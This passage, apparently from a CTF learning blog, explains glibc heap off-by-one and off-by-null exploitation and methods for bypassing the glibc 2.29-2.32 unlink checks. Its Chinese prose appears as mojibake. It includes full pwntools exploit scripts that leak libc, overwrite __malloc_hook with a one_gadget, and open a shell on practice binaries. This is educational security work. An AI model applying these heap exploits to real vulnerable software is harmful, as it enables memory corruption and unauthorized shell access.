class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x68</span>+p8(<span class="hljs-number">0xe1</span>))<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b78</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0xd0</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">4</span>,payload)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="offbynull"><a href="#offbynull" class="headerlink" title="offbynull"></a>offbynull</h1><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>å…¶å®æœ¬è´¨ä¹Ÿæ˜¯ä¸€ç§offbyoneï¼Œåªæ˜¯è¿™ä¸ªæº¢å‡ºçš„å­—èŠ‚æˆ‘ä»¬æ— æ³•æ§åˆ¶ï¼Œåªèƒ½æ˜¯0ã€‚æ‰€ä»¥æ„é€ æ–¹æ³•ä¼šä¸offbyoneæœ‰äº›ä¸åŒï¼Œä½†ç›®çš„éƒ½æ˜¯ä¸ºäº†åˆ¶é€ å‡ºoverlapï¼Œæ¯•ç«Ÿuafæ‰æ˜¯å †åˆ©ç”¨çš„æ ¸å¿ƒï¼</p><p>offbynullæƒ…å½¢ï¼š</p><ul><li>æŠŠä½ è¾“å…¥çš„å †å—çš„åœ°å€åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦é•¿åº¦çš„åœ°æ–¹ç½®ä¸º0ï¼ˆä¸€èˆ¬æ¥è¯´æ²¡æˆ‘ä¸‹é¢çš„ä¾‹é¢˜é‚£ä¹ˆæ˜æ˜¾ï¼Œä¼šè¿›è¡Œå¾ˆå¤šè¿ç®—ä»¥åŠæ“ä½œï¼Œä½†æ˜¯æœ¬è´¨è¿˜æ˜¯ä¸€æ ·çš„ï¼‰</li></ul><p>æ€ä¹ˆåˆ©ç”¨å‘¢ï¼Ÿå› ä¸ºæº¢å‡ºçš„æ˜¯0ï¼Œæ‰€ä»¥æ˜æ˜¾åªèƒ½æŠŠä¿®æ”¹preinuseä½ä¿®æ”¹äº†ï¼Œæ‰€ä»¥è¿™è¾¹éƒ½æ˜¯ç”³è¯·0xf8å¤§å°çš„å †å—ï¼Œè¿™æ ·çš„å †å—åˆšå¥½ä¸º0x101ï¼Œæº¢å‡ºçš„0åªä¼šä¿®æ”¹preinuseï¼Œä¸ä¼šå½±å“å¤§å°</p><p>åˆ©ç”¨æ–¹å¼ï¼š</p><p>abcdå››ä¸ªå¤§å°ä¸º0x100çš„å †å—ï¼Œéƒ½æ˜¯åœ¨ä½¿ç”¨çŠ¶æ€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬çš„ç›®æ ‡å †å—æ˜¯Cå †å—</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170224084.png" alt="image-20210726170224084" style="zoom:80%;"><p>æˆ‘ä»¬åœ¨Bä¸­è¾“å…¥ â€˜Aâ€™*0x90 + p64(0x200) + â€˜\x00â€™ï¼Œè¾“å…¥å®Œåå¸ƒå±€å°†ä¼šå˜åŒ–æˆè¿™æ ·</p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726170351639.png" alt="image-20210726170351639" style="zoom:80%;"><p>æ­¤æ—¶ï¼ŒCçš„previnuseä½è¢«æ”¹æˆäº†0ï¼Œç¨‹åºä¼šå°†Bçœ‹ä½œå·²ç»è¢«é‡Šæ”¾çš„å †å—ã€‚ç„¶åç”±äºç³»ç»Ÿæ˜¯é€šè¿‡prevsizeä½æ¥å®šä½å‰ä¸€ä¸ªå †å—çš„ä½ç½®ï¼Œåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å°†å…¶æ”¹æˆäº†0x200,ä¹Ÿå°±æ˜¯è¯´å®šä½åˆ°äº†Aå †å—ã€‚ç„¶åå…ˆå°†A freeæ‰æ”¾å…¥unsortedbinï¼Œè¿™æ—¶å€™å†free Cï¼Œå°±ä¼šè§¦å‘åˆå¹¶æ“ä½œã€‚ABCå°†ä¼šè¢«çœ‹ä½œä¸€ä¸ªå¤§å°ä¸º0x300çš„å †å—æ”¾å…¥unsortedbinä¸­ã€‚ç„¶è€Œå®é™…ä¸Šï¼ŒBå¹¶æ²¡æœ‰è¢«freeï¼Œæˆ‘ä»¬ä¹Ÿå°±é€šè¿‡è¿™æ ·çš„æ–¹å¼æ„é€ äº†overlap</p><p>åœ¨å®é™…è¿ç”¨æ—¶ï¼Œä¸å±€é™éƒ½æ˜¯0x100çš„ï¼Œå¯ä»¥æ˜¯ä¸­é—´çš„æŸä¸ªå †å—æ˜¯fast chunkä¹Ÿè¡Œï¼Œä½†æ˜¯ç¬¬ä¸€ä¸ªåœ¨å¤´çš„å¿…é¡»ä¹Ÿå¾—æ˜¯unsorted chunkå¤§å°çš„å †å—ï¼Œå¦åˆ™è§¦å‘åˆå¹¶ä¼šå‡ºé—®é¢˜</p><h2 id="ä¾‹é¢˜-1"><a href="#ä¾‹é¢˜-1" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726173924395.png" alt="image-20210726173924395"></p><p>çœ‹ç¨‹åºçš„addå‡½æ•°é‡Œé¢ï¼Œä¼šæŠŠè¾“å…¥çš„é•¿åº¦å¤šä¸€ä¸ªå­—èŠ‚çš„åœ°æ–¹ç½®ä¸º0</p><p>è¿™è¾¹æœ‰äº›å¥‡æ€ªï¼Œä¸æ‡‚ä¸ºä»€ä¹ˆï¼Œå¦‚æœåªæ˜¯ç”¨å››ä¸ªè¿›è¡Œæ„é€ ï¼Œå°†ä¼šæŠ¥é”™ï¼Œä½†æ˜¯äº”ä¸ªå°±è¡Œï¼Œç¬¬ä¸€ä¸ªæ˜¯ç”¨æ¥æ³„éœ²libcåŸºå€çš„ï¼Œä¸ç”¨ç†ä¼š</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174131814.png" alt="image-20210726174131814"></p><p>è¿™æ˜¯ä¿®æ”¹å®Œç›®æ ‡å †å—ï¼Œä»¥åŠé‡Šæ”¾äº†æŒ‡å‘çš„å †å—ï¼ˆç›®æ ‡å †å—å‡å»0x300ï¼‰</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174439990.png" alt="image-20210726174439990"></p><p>æœ€åæŠŠç›®æ ‡å †å—é‡Šæ”¾ï¼Œè§¦å‘åˆå¹¶ï¼Œå˜æˆäº†0x400çš„å †å—</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20210726174611943.png" alt="image-20210726174611943"></p><p>ä¹‹åå°±æ˜¯æ„é€ å¤§å°ä¸º0x71çš„å †å—ï¼Œè¿™è¾¹æ„é€ å †å—è¦æ³¨æ„ï¼Œåœ¨è¢«æ„é€ çš„å †å—åé¢è¿˜è¦æ„é€ ä¸€ä¸ªå †å¤´ï¼Œå› ä¸ºéœ€è¦preinuseä½ç½®ä¸º1æ¥è¡¨ç¤ºæˆ‘ä»¬æ„é€ çš„å †å—æ˜¯è¢«ä½¿ç”¨çš„ï¼Œç„¶åæ‰èƒ½è¢«é‡Šæ”¾è¿›å…¥åˆ°fastbiné‡Œé¢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./offbynull&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;delete&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45206 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4525a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xef9f4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf0897 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;dddd&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;eeee&#x27;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;gggg&#x27;</span>)<br><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)<br>libc_base=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3c3b00</span><br>mlh=libc_base+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg=libc_base+<span class="hljs-number">0xef9f4</span><br>log.success(<span class="hljs-built_in">hex</span>(libc_base))<br>log.success(<span class="hljs-built_in">hex</span>(ogg))<br>log.success(<span class="hljs-built_in">hex</span>(mlh))<br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x300</span>))<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">4</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x81</span>)  <span class="hljs-comment">#0x81è®©ç³»ç»ŸçŸ¥é“å‰é¢çš„å †å—æ˜¯è¢«ä½¿ç”¨çš„</span><br><br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x1f0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(mlh-<span class="hljs-number">0x30</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">1</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(ogg))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;x&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="glibc2-29-2-32-off-by-null-bypass"><a href="#glibc2-29-2-32-off-by-null-bypass" class="headerlink" title="glibc2.29~2.32 off by null bypass"></a>glibc2.29~2.32 off by null bypass</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è§‚å…‰æµè§ˆå¤§ä½¬åšå®¢æ—¶ï¼Œå‘ç°å¤§ä½¬ç«Ÿç„¶æ•´ç†äº†ä¸€ç¯‡glibc2.29~2.32 off by null bypassï¼Œå¦‚è·è‡³å®ï¼Œå­¦ä¹ ä¸ºæ•¬ï¼</p><p>åšå®¢åœ°å€ï¼š<a href="http://blog.wjhwjhn.com/archives/193/">http://blog.wjhwjhn.com/archives/193/</a></p><h2 id="ä»‹ç»-2"><a href="#ä»‹ç»-2" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>åœ¨ glibc2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œglibc åœ¨ unlink å†…åŠ å…¥äº† prevsize checkï¼Œè€Œé€šè¿‡ off by null æ¼æ´æ ¹æœ¬æ— æ³•ç›´æ¥ä¿®æ”¹æ­£å¸¸ chunk çš„ sizeï¼Œå¯¼è‡´æƒ³è¦ é€šè¿‡unlink åˆ¶é€ å‡ºå †å—é‡å å˜å¾—å‡ ä¹ä¸å¯èƒ½ã€‚å½“ç„¶ off by one æ˜¯æ²¡æœ‰å½±å“çš„ã€‚æ‰€ä»¥åœ¨ 2.29 ä»¥ä¸Šç‰ˆæœ¬ï¼Œoff by null çš„åˆ©ç”¨åªæœ‰å”¯ä¸€çš„æ–¹æ³• â€”â€” ä¼ªé€  FD å’Œ BK</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">prev_inuse</span>(p)) &#123;<br>  prevsize = <span class="hljs-built_in">prev_size</span> (p);<br>  size += prevsize;<br>  p = <span class="hljs-built_in">chunk_at_offset</span>(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (<span class="hljs-built_in">chunksize</span>(p) != prevsize))<br>    <span class="hljs-built_in">malloc_printerr</span> (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-built_in">unlink_chunk</span> (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼ªé€  FD å’Œ BK éœ€è¦ç»•è¿‡ä¸‹é¢çš„æ£€æµ‹æ‰è¡Œ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);<br></code></pre></td></tr></table></figure><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="no-pie"><a href="#no-pie" class="headerlink" title="no pie"></a>no pie</h3><p>è¿™ç§æƒ…å†µå…¶å®å°±æ˜¯æˆ‘ä¹‹å‰å†™è¿‡çš„unlink attackï¼ŒåŠ«æŒç¨‹åºä¸­ç”¨äº<strong>å‚¨å­˜å †å—æŒ‡é’ˆçš„æ•°ç»„</strong>ï¼Œä»è€Œè¾¾æˆä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚è¯¦ç»†æƒ…å†µè¯·ç§»æ­¥åˆ°è¯¥ç¯‡åšå®¢ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°</p><h3 id="æ‹¥æœ‰å †åœ°å€"><a href="#æ‹¥æœ‰å †åœ°å€" class="headerlink" title="æ‹¥æœ‰å †åœ°å€"></a>æ‹¥æœ‰å †åœ°å€</h3><p><img src="/2021/07/20/2021-07-26-offbyone&null/0ce506d87fdbbe100ec80d1bc6f87725.png" alt="å›¾ç‰‡"></p><p>æˆ‘ä»¬å¯ä»¥ä»¿ç…§ä¸Šé¢çš„æƒ…å†µï¼Œåœ¨ä¸€ä¸ªå¯ä»¥å†™å…¥å†…å®¹çš„å †å—æ¯”å¦‚0x20çš„ä½ç½®ï¼ˆptrï¼‰ä¸Šå¡«å…¥å°†è¦unlinkçš„å †å—åœ°å€ï¼Œç„¶ååœ¨å°†è¦unlinkçš„å †å—çš„ fdï¼Œbk æŒ‡é’ˆä¸Šå†™å…¥<code>ptr-0x18</code>ï¼Œ<code>ptr-0x10</code>å³å¯ç»•è¿‡æ£€æµ‹ï¼Œå®ç°unlink</p><h3 id="æ— æ³•æ³„éœ²å †åœ°å€"><a href="#æ— æ³•æ³„éœ²å †åœ°å€" class="headerlink" title="æ— æ³•æ³„éœ²å †åœ°å€"></a>æ— æ³•æ³„éœ²å †åœ°å€</h3><p>ä¸å¯æ³„éœ²å †åœ°å€çš„å„ç§æ–¹æ³•å½’æ ¹ç»“åº•éƒ½æ˜¯é€šè¿‡<strong>éƒ¨åˆ†å†™å…¥</strong>å’Œ<strong>å„ç§å †ç®¡ç†å™¨çš„æ€§è´¨</strong>æ¥æ”¹å†™å‡ºæƒ³è¦æŒ‡å‘çš„å †å—åœ°å€ä»è€Œç»•è¿‡æ£€æµ‹</p><h4 id="ä¸€ã€åœ¨å€Ÿç”¨large-chunkä¸Šçš„åƒåœ¾æ•°æ®"><a href="#ä¸€ã€åœ¨å€Ÿç”¨large-chunkä¸Šçš„åƒåœ¾æ•°æ®" class="headerlink" title="ä¸€ã€åœ¨å€Ÿç”¨large chunkä¸Šçš„åƒåœ¾æ•°æ®"></a>ä¸€ã€åœ¨å€Ÿç”¨large chunkä¸Šçš„åƒåœ¾æ•°æ®</h4><p>å½“åªæœ‰ä¸€ä¸ªlarge chunkåœ¨ bin é“¾ä¸Šæ—¶ï¼Œfd_nextsize å’Œ bk_nextsize æ˜¯å­˜æ”¾large chunkæœ¬èº«çš„åœ°å€ã€‚æˆ‘ä»¬å°±æ˜¯è¦åˆ©ç”¨è¿™ä¸¤ä¸ªæ®‹ä½™çš„åƒåœ¾çš„æ•°æ®ï¼ŒæŠŠè¿™ä¸¤ä¸ªæ•°æ®ä½œä¸ºæˆ‘ä»¬è¦æ„é€ çš„ fake chunk çš„ fd bk æŒ‡é’ˆã€‚</p><p>ç„¶åå¤§ä½¬åšå®¢æ²¡æœ‰ä»‹ç»çš„å¾ˆæ¸…æ¥šï¼ˆå¤§ä½¬éƒ½æ˜¯è¿™æ ·çš„ï¼‰ï¼Œæˆ‘è¿™è¾¹ä¼šæ›´åŠ è¯¦ç»†çš„ä»‹ç»å…¶ä¸­çš„ç»†èŠ‚</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161409749.png" alt="image-20211001161409749"></p><p>é¦–å…ˆè¿™æ˜¯ large chunk çš„ç»“æ„</p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001164643331.png"></p><p><img src="/2021/07/20/2021-07-26-offbyone&null/image-20211001161853438.png" alt="image-20211001161853438"></p><p>è¿™æ˜¯ç»è¿‡ä¼ªé€ åçš„ large chunk ä»¥åŠæˆ‘ä»¬è¦ç”¨å¾—ä¸€ä¸ªå¯ä»¥è¢«æ§åˆ¶çš„ chunk ï¼Œé¦–å…ˆä»0x10å¼€å§‹ä½œä¸º fake chunk çš„å †å¤´å¼€å§‹å¸ƒç½®ï¼Œé€šè¿‡éƒ¨åˆ†å†™æŠŠ fake fdæŒ‡é’ˆæ”¹ä¸º chunk çš„åœ°å€ï¼ŒåŒæ—¶éƒ¨åˆ†å†™å…¥ä¿®æ”¹ chunk bk æŒ‡é’ˆä¸º fake chunkï¼Œä»è€Œç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ FD-&gt;bk == p</p><p>æ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡ç¬¬äºŒä¸ªæ£€æŸ¥ BK-&gt;fd == pï¼Œæˆ‘ä»¬åˆ©ç”¨fastbinçš„ç‰¹æ€§ï¼šä¼šåœ¨fdæŒ‡é’ˆç•™ä¸‹å‰ä¸€å—çš„å †åœ°å€ï¼Œåœ¨ large chunk çš„ fd æŒ‡é’ˆä½ç½®å†™å…¥å †åœ°å€ï¼Œç„¶åå€Ÿç€éƒ¨åˆ†å†™å…¥ä¿®æ”¹ä¸º fake chunk addr - 0x10ï¼Œå®Œæˆç¬¬äºŒä¸ªæ£€æŸ¥çš„ç»•è¿‡ã€‚</p><p>æˆ‘ä¹‹æ‰€ä»¥æ²¡æœ‰å†é‡è¿°tcacheæ˜¯å› ä¸ºï¼šåœ¨æ„çš„åœ°æ–¹æ˜¯glibc 2.29ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œä»¥ä¸‹çš„ç‰ˆæœ¬æ²¡å¿…è¦ä½¿ç”¨è¿™ä¹ˆéº»çƒ¦çš„åŠæ³•æ„é€ ï¼Œè€Œå†glibc 2.29ä»¥ä¸Šçš„ç‰ˆæœ¬åŠ å…¥çš„keyå­—æ®µä¼šç ´åbkæŒ‡é’ˆçš„å†…å®¹</p><p>ä¿®æ”¹æ–¹æ³•ä¸ºï¼šç„¶åå…ˆé‡Šæ”¾ aï¼Œå†é‡Šæ”¾ largebin chunkï¼Œè¿™æ—¶å€™å† largebin chunk + 0x10 çš„ä½ç½®å°±ä¼šæœ‰ä¸€ä¸ª a çš„æŒ‡é’ˆã€‚æˆ‘ä»¬å†ç”¨éƒ¨åˆ†å†™å…¥å°†æŒ‡é’ˆæ”¹å†™æˆ largebin chunk + 0x10 çš„åœ°å€ã€‚</p><p>ä½†æ˜¯è¿™ç§æ–¹æ³•ï¼Œæœ‰ç‚¹è¿‡äºç¹çã€‚ã€‚ã€‚å¹¶ä¸”ä¸å¤ªç°å®ï¼Œéœ€è¦fastchunk å’Œlarge chunkï¼Œç”³è¯·æ¬¡æ•°å¤§å¤šé¢˜ç›®ä¸ç»™è¿™ä¹ˆå¤šçš„ã€‚äº†è§£å³å¯</p><h4 id="äºŒã€åˆ©ç”¨-unsorted-bin-å’Œ-large-bin-é“¾æœºåˆ¶"><a href="#äºŒã€åˆ©ç”¨-unsorted-bin-å’Œ-large-bin-é“¾æœºåˆ¶" class="headerlink" title="äºŒã€åˆ©ç”¨ unsorted bin å’Œ large bin é“¾æœºåˆ¶"></a>äºŒã€åˆ©ç”¨ unsorted bin å’Œ large bin é“¾æœºåˆ¶</h4><p>è¿™éƒ¨åˆ†å†…å®¹å¦‚æœåˆ©ç”¨å¾—å½“ï¼Œå¯ä»¥åœ¨é¢˜ç›®çš„è‹›åˆ»çš„æ¡ä»¶ä¸‹ï¼ˆå¦‚ä¼šåœ¨æœ«å°¾å†™å…¥ x00 ç­‰â€¦ï¼‰ä¹Ÿå¯ä»¥æ— éœ€çˆ†ç ´ä¼ªé€ å †å—ï¼Œç€é‡å­¦ä¹ ï¼ŒæŒæ¡</p><p>ä»¥ä¸‹å†…å®¹å…¨éƒ¨å¤åˆ¶è‡ªå¤§ä½¬åšå®¢ï¼š</p><h5 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h5><h5 